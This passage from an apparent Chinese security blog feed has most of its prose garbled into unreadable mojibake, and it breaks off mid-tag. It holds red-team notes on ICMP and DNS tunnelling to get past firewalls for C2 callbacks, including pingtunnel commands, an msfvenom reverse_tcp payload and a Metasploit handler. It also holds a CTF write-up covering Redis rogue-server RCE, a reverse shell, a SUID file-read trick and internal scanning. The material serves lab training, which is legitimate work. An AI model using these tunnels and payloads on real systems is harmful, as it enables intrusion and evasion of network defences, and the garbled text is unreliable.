åŸŸç¯å¢ƒä¸‹</p><p>2ã€å†…ç½‘æœ‰åŸŸç¯å¢ƒä¸‹ï¼ˆå¼ºåˆ¶ç­–ç•¥åŒæ­¥ï¼‰</p><p>Windowsé˜²ç«å¢™å‘½ä»¤ï¼š</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p><p>æŸ¥çœ‹å½“å‰é˜²ç«å¢™çŠ¶æ€ï¼šnetsh advfirewall show allprofiles</p><p>å…³é—­é˜²ç«å¢™ï¼šnetsh advfirewall set allprofiles state off</p><p>å¼€å¯é˜²ç«å¢™ï¼šnetsh advfirewall set allprofiles state on</p><p>æ¢å¤åˆå§‹é˜²ç«å¢™è®¾ç½®ï¼šnetsh advfirewall reset</p><p>å¯ç”¨æ¡Œé¢é˜²ç«å¢™: netsh advfirewall set allprofiles state on</p><p>è®¾ç½®é»˜è®¤è¾“å…¥å’Œè¾“å‡ºç­–ç•¥ï¼šnetsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</p><p>å¦‚æœè®¾ç½®ä¸ºæ‹’ç»ä½¿ç”¨blockinbound,blockoutbound</p><h3 id="å­¦éš§é“å‰å…ˆææ¸…æ¥š"><a href="#å­¦éš§é“å‰å…ˆææ¸…æ¥š" class="headerlink" title="å­¦éš§é“å‰å…ˆææ¸…æ¥š"></a>å­¦éš§é“å‰å…ˆææ¸…æ¥š</h3><p>0ã€ä¸æ˜¯æœ‰äº’è”ç½‘æ‰å«å‡ºç½‘ï¼ˆèƒ½å’Œå…¶ä»–è®¡ç®—æœºæ­£å¸¸é€šè®¯å°±ç®—å‡ºç½‘ï¼‰</p><p>1ã€C2å¸¸è§ä¸Šçº¿é‡‡ç”¨çš„åè®®</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740561137428-24aa4c4d-9b44-4bbc-b283-2b19cdf445ca.png"></p><p>2ã€å¸¸è§çš„åè®®å±‚å‡ºç½‘åˆ¤æ–­</p><p>å¸¸ç”¨çš„éš§é“æŠ€æœ¯ï¼š</p><p>åˆ©ç”¨å„ç§éš§é“æŠ€æœ¯ï¼Œä»¥ç½‘ç»œé˜²ç«å¢™å…è®¸çš„åè®®ï¼Œ</p><p>ç»•è¿‡ç½‘ç»œé˜²ç«å¢™çš„å°é”ï¼Œå®ç°è®¿é—®è¢«å°é”çš„ç›®æ ‡ç½‘ç»œ</p><p>ç½‘ç»œå±‚ï¼šIPv6 éš§é“ã€ICMP éš§é“</p><p>ä¼ è¾“å±‚ï¼šTCP éš§é“ã€UDP éš§é“ã€å¸¸è§„ç«¯å£è½¬å‘</p><p>åº”ç”¨å±‚ï¼šSSH éš§é“ã€HTTP&#x2F;S éš§é“ã€DNS éš§é“</p><h4 id="åè®®-åˆ¤æ–­å‘½ä»¤"><a href="#åè®®-åˆ¤æ–­å‘½ä»¤" class="headerlink" title="åè®® åˆ¤æ–­å‘½ä»¤"></a>åè®® åˆ¤æ–­å‘½ä»¤</h4><p>ICMP ping ip or domain</p><p>HTTP curl ip or domain</p><p>SSH ssh ip or domain</p><p>DNS nslookup domain</p><p>TCP telnet ip port</p><p>æ³¨æ„ç›®æ ‡ä¸€å®šè¦æ˜¯æ­£å¸¸çš„ç›®æ ‡</p><h3 id="å¼€é˜²ç«å¢™å…¥ç«™åª80-å‡ºç«™åªæ”¾ICMPï¼š"><a href="#å¼€é˜²ç«å¢™å…¥ç«™åª80-å‡ºç«™åªæ”¾ICMPï¼š" class="headerlink" title="å¼€é˜²ç«å¢™å…¥ç«™åª80&amp;å‡ºç«™åªæ”¾ICMPï¼š"></a>å¼€é˜²ç«å¢™å…¥ç«™åª80&amp;å‡ºç«™åªæ”¾ICMPï¼š</h3><p>icmpå¯ç”¨äºæ–‡ä»¶æ‰“å°å’Œå…±äº«</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574068787-31e27500-bd56-4840-9e1e-d00d2e8de4fc.png"></p><p>ICMP é€šè¿‡ PING å‘½ä»¤è®¿é—®è¿œç¨‹è®¡ç®—æœºï¼Œå»ºç«‹ ICMP éš§é“ï¼Œå°† TCP&#x2F;UDP æ•°æ®å°è£…åˆ° ICMP çš„ PING æ•°æ®åŒ…ä¸­ï¼Œä»è€Œç©¿è¿‡é˜²ç«å¢™ï¼Œé˜²ç«å¢™ä¸€èˆ¬ä¸ä¼šå±è”½ PING æ•°æ®åŒ…ï¼Œå®ç°ä¸å—é™åˆ¶çš„è®¿é—®ã€‚</p><p>åº”ç”¨åœºæ™¯ï¼š80ä¸ºå…¥å£æƒé™ç‚¹ï¼ŒICMPä¸ºä¸Šçº¿çªç ´å£</p><p>é€‚ç”¨åœºæ™¯ï¼šç›®æ ‡å…¥ç«™æ­£å‘è¢«æ‹¦æˆªï¼Œå‡ºç«™æœ‰ICMPå‡ºç½‘</p><p>æ’æŸ¥å‡ºç½‘åè®®ï¼šcurl nslookup pingç­‰å‘½ä»¤</p><p>æ‹¿åˆ°æœåŠ¡å™¨æƒé™åï¼Œå…ˆpingåˆ¤æ–­icmpèƒ½å‡º</p><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p><p>CS:</p><p>kaliæ”»å‡»æœºä¸Šèµ·æœåŠ¡</p><p>.&#x2F;pingtunnel -typeserver</p><p>å°†æœ¬åœ°6666æµé‡è½¬å‘åˆ°192.168.139.141:777ä¸Šé¢ï¼ˆtcpæµé‡å°è£…æˆicmpè½¬å‘ï¼‰</p><p>æ²¦é™·æœºå™¨æ‰§è¡Œ</p><p>pingtunnel -typeclient -l:6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp 1 -noprint 1 -nolog 1</p><p>ç›‘å¬å™¨é…ç½®ï¼š</p><p>127.0.0.1 6666ï¼ˆåé—¨ç”Ÿæˆï¼‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574983464-3ea7dcc8-1475-40b1-8257-3884efe2de05.png"></p><p>192.168.139.141 7777ï¼ˆç›‘å¬ä¸Šçº¿ï¼‰</p><p>åŒç†kaliæ”»å‡»æœºä¹ŸåŠ ä¸Š</p><p>ç”Ÿæˆcsåé—¨æ—¶ï¼Œç”Ÿæˆ127.0.0.1:6666çš„åé—¨</p><p>ä»æ”»å‡»æœºä¸Šæµé‡å…¨æ˜¯icmpæµé‡</p><p>MSF:</p><p>ç”Ÿæˆåé—¨ï¼š</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;127.0.0.1LPORT&#x3D;3333 -f exe -o msf.exe</p><p>éš§é“ï¼š</p><p>pingtunnel -typeclient -l:3333 -s 192.168.139.141 -t 192.168.139.141:3344 -tcp 1 -noprint 1 -nolog 1</p><p>ç›‘å¬å™¨é…ç½®ï¼š</p><p>msfconsole</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3344</p><p>run</p><h3 id="å¼€é˜²ç«å¢™å…¥ç«™åª80-å‡ºç«™åªæ”¾DNSï¼š"><a href="#å¼€é˜²ç«å¢™å…¥ç«™åª80-å‡ºç«™åªæ”¾DNSï¼š" class="headerlink" title="å¼€é˜²ç«å¢™å…¥ç«™åª80&amp;å‡ºç«™åªæ”¾DNSï¼š"></a>å¼€é˜²ç«å¢™å…¥ç«™åª80&amp;å‡ºç«™åªæ”¾DNSï¼š</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574120561-3bb62688-6856-4ce5-a532-03e86f133ccd.png"></p><p>åº”ç”¨åœºæ™¯ï¼š80ä¸ºå…¥å£æƒé™ç‚¹ï¼ŒDNSä¸ºä¸Šçº¿çªç ´å£</p><p>é€‚ç”¨åœºæ™¯ï¼šç›®æ ‡å…¥ç«™æ­£å‘è¢«æ‹¦æˆªï¼Œå‡ºç«™æœ‰DNSå‡ºç½‘</p><p>æ’æŸ¥å‡ºç½‘åè®®ï¼šcurl nslookup pingç­‰å‘½ä»¤</p><p>CS:</p><p>-åŸŸåç”³è¯·åŠé…ç½®</p><p>-ç›‘å¬å™¨åˆ›å»ºåŠé…ç½®</p><p>-åé—¨ç»‘å®šç›‘å¬å™¨ç”Ÿæˆ</p><p>æä¸ªåŸŸåç»‘å®šåˆ°å…¬ç½‘æœåŠ¡å™¨ä¸»æœºä¸Šå»ï¼Œåœ¨å…¬ç½‘æœåŠ¡å™¨èµ·c2å°±è¡Œäº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740576856688-413f6eaf-f123-4b69-9663-851b0f1a9506.png"></p><p>ns8.calm.com-&gt;c2.calm.com</p><p>ns9.calm.com-&gt;c2.calm.com</p><p>c2.calm.com-&gt;å…¬ç½‘æœåŠ¡å™¨ip</p><p>ä¸Šçº¿ä¹‹åä¼šå‘ç°csé¡µé¢æ¯”è¾ƒæ…¢ï¼Œæ­¤æ—¶åœ¨cså‘½ä»¤è¡Œæ‰§è¡Œä¸‹é¢å‘½ä»¤</p><p>checkin</p><p>mode dns-txt</p><p>MSF:</p><p>proç‰ˆæœ¬çš„reverse_dnsæ¨¡å—</p><p><a href="https://zhuanlan.zhihu.com/p/424351656">https://zhuanlan.zhihu.com/p/424351656</a></p><p><a href="https://blog.csdn.net/vspiders/article/details/78999624">https://blog.csdn.net/vspiders/article/details/78999624</a></p><p>msfæ…¢æ…¢è¢«æ·˜æ±°äº†ï¼Œå› ä¸ºcsæœ‰å¿ƒè·³åŒ…ï¼Œmsfæ˜¯sessionå¾ˆå®¹æ˜“è¢«æ€</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
            <tag> éš§é“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Brute4Road</title>
      <link href="/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"/>
      <url>/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/</url>
      
        <content type="html"><![CDATA[<h1 id="Brute4Road"><a href="#Brute4Road" class="headerlink" title="Brute4Road"></a>Brute4Road</h1><h2 id="redisä¸»ä»å¤åˆ¶æ‹¿shell"><a href="#redisä¸»ä»å¤åˆ¶æ‹¿shell" class="headerlink" title="redisä¸»ä»å¤åˆ¶æ‹¿shell"></a>redisä¸»ä»å¤åˆ¶æ‹¿shell</h2><p>fscanæ‰«æï¼Œ6379ç«¯å£å¼€æ”¾ï¼Œå°è¯•redisæ¼æ´ï¼Œå‘ç°ä¸»ä»å¤åˆ¶rceï¼ˆ<a href="https://github.com/n0b0dyCN/redis-rogue-server%EF%BC%89%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%EF%BC%8C%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86%EF%BC%9A%E4%B8%BB%E6%9C%BA%E8%B4%9F%E8%B4%A3%E5%86%99%EF%BC%8C%E4%BB%8E%E6%9C%BA%E8%B4%9F%E8%B4%A3%E8%AF%BB%EF%BC%8C%E5%AE%9E%E7%8E%B0%E8%AF%BB%E5%86%99%E5%88%86%E6%B5%81">https://github.com/n0b0dyCN/redis-rogue-serverï¼‰å¯ä»¥åˆ©ç”¨ï¼Œä¸»ä»å¤åˆ¶åŸç†ï¼šä¸»æœºè´Ÿè´£å†™ï¼Œä»æœºè´Ÿè´£è¯»ï¼Œå®ç°è¯»å†™åˆ†æµ</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092716321-d3b5d67e-40b7-4485-9095-14d84c151540.png"></p><p>redisç³»åˆ—æ¼æ´å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/249238.html">https://www.freebuf.com/articles/web/249238.html</a><br>åœ¨vpsä¸Šæ‰§è¡Œï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092812558-c7fef9cf-dfa3-4240-9971-cb00215aa194.png"></p><p>è¾“å…¥rï¼Œåå‘shell</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092950977-9c8831e5-934c-4a17-b8c8-40f85177599d.png"></p><p>æ­¤æ—¶vpså†ç›‘å¬å…¶ä»–ç«¯å£æ¥å—åå¼¹çš„shell,å¼¹å‡ºæ¥shellä¹‹ååˆ›å»ºä¸€ä¸ªä¼ªç»ˆç«¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093101229-62ade2b8-9102-43d1-afde-6f624f99f470.png"></p><p>&#x2F;home&#x2F;redisçœ‹åˆ°flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093217907-54cbd57a-3ccd-44c3-b335-c5fa16b20091.png"></p><p>cat flagå‘ç°æƒé™ä¸å¤Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093272153-a0fb0d59-8f71-4273-bb6c-afaa8670791a.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>suidææƒæ¢é’ˆ</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093368204-26e10a63-1b43-4372-a04d-8a64a6b3e80a.png"></p><p>è¿™é‡Œç”¨base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 &quot;/home/redis/flag/flag01&quot; | base64 --decode</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093443543-c7b82852-e534-420c-91fc-9fb46463067d.png"></p><p>çœ‹åˆ°å†…ç½‘ç½‘æ®µ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094138850-39681a91-0a6a-4653-9f3e-19b8f4172f5a.png"></p><p>wget ä¸‹è½½fscanï¼Œæ‰«æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094097680-ed140052-dfad-4a82-b3c8-67acd012e3ca.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.0/24</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚    ___                              _        â”‚</span><br><span class="line">â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚</span><br><span class="line">â”‚  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    â”‚</span><br><span class="line">â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     â”‚</span><br><span class="line">â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-03-04 21:17:06] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1</span><br><span class="line">[2025-03-04 21:17:06] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ</span><br><span class="line">[2025-03-04 21:17:06] [INFO] CIDRèŒƒå›´: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-03-04 21:17:06] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-04 21:17:06] [INFO] è§£æCIDR 172.22.2.0/24 -&gt; IPèŒƒå›´ 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-03-04 21:17:06] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256</span><br><span class="line">[2025-03-04 21:17:06] [INFO] å¼€å§‹ä¸»æœºæ‰«æ</span><br><span class="line">[2025-03-04 21:17:06] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...</span><br><span class="line">[2025-03-04 21:17:06] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…</span><br><span class="line">[2025-03-04 21:17:06] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] ç›®æ ‡ 172.22.2.3      å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] ç›®æ ‡ 172.22.2.7      å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] ç›®æ ‡ 172.22.2.16     å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-04 21:17:07] [SUCCESS] ç›®æ ‡ 172.22.2.18     å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-04 21:17:07] [SUCCESS] ç›®æ ‡ 172.22.2.34     å­˜æ´» (ICMP)</span><br><span class="line">[2025-03-04 21:17:12] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 5</span><br><span class="line">[2025-03-04 21:17:12] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:22</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:22</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:21</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:389</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:88</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:1433</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:6379</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:22 =&gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:21 =&gt; [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:80 =&gt; [http] ç‰ˆæœ¬:2.0 äº§å“:Microsoft HTTPAPI httpd ç³»ç»Ÿ:Windows</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:80 =&gt; [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:389 =&gt; [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:19] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-03-04 21:17:19] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:1433 =&gt; [ms-sql-s] ç‰ˆæœ¬:13.00.4001; SP1 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.]</span><br><span class="line">[2025-03-04 21:17:20] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-03-04 21:18:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-03-04 21:18:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:139 =&gt; </span><br><span class="line">[2025-03-04 21:18:14] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 21</span><br><span class="line">[2025-03-04 21:18:18] [INFO] å¼€å§‹æ¼æ´æ‰«æ</span><br><span class="line">[2025-03-04 21:18:18] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo æ‰«æç»“æœ</span><br><span class="line">ç›®æ ‡ä¸»æœº: 172.22.2.16</span><br><span class="line">ä¸»æœºå: MSSQLSERVER</span><br><span class="line">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="line">   IPv4åœ°å€:</span><br><span class="line">      â””â”€ 172.22.2.16</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.7         çŠ¶æ€ç :200 é•¿åº¦:4833   æ ‡é¢˜:Welcome to CentOS</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.16        çŠ¶æ€ç :404 é•¿åº¦:315    æ ‡é¢˜:Not Found</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo æ‰«æç»“æœ</span><br><span class="line">ç›®æ ‡ä¸»æœº: 172.22.2.34</span><br><span class="line">ä¸»æœºå: CLIENT01</span><br><span class="line">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="line">   IPv4åœ°å€:</span><br><span class="line">      â””â”€ 172.22.2.34</span><br><span class="line">[2025-03-04 21:18:18] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-03-04 21:18:18] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo æ‰«æç»“æœ</span><br><span class="line">ç›®æ ‡ä¸»æœº: 172.22.2.3</span><br><span class="line">ä¸»æœºå: DC</span><br><span class="line">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="line">   IPv4åœ°å€:</span><br><span class="line">      â””â”€ 172.22.2.3</span><br><span 